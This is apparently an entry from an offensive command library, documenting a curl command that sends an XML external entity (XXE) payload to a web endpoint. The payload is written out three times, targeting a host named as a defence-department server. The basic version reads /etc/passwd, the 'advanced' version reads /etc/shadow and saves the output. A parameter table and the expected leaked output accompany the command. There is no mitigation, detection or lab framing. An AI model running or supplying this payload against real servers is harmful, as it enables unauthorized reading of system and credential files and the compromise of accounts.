---
data: >-
  curl -X POST -H "Content-Type: application/xml" --data '<?xml
  version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><foo>&xxe;</foo>'
  https://vulnerable.dod-server.com/endpoint
tags:
  - xxe
  - web
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 497f0fdb-4e17-41ce-9065-5ac2dc84d311
created_at: '2025-12-13T09:00:27.943Z'
updated_at: '2025-12-13T09:00:27.943Z'
verified: false
validated: true
submitted: true
---
# curl-send-malicious-xml-request

## Command

```bash
curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' https://vulnerable.dod-server.com/endpoint
```

## Description

This command uses curl to send a POST request with a malicious XML payload designed to exploit XXE vulnerabilities, attempting to read and return the contents of a sensitive file like /etc/passwd from the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/xml"` | Sets the content type to XML | Yes |
| `--data` | The malicious XML payload to send | Yes |
| `https://vulnerable.dod-server.com/endpoint` | The target URL of the vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' https://vulnerable.dod-server.com/endpoint
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>' https://vulnerable.dod-server.com/endpoint -o output.txt
```

## Expected Output

The server's response containing the contents of the referenced file, such as user account details from /etc/passwd, if the exploitation is successful.

## Related

- [[procedures/Exploit-XXE-Vulnerability-via-Malicious-XML-Request]]
- [[tools/curl]]
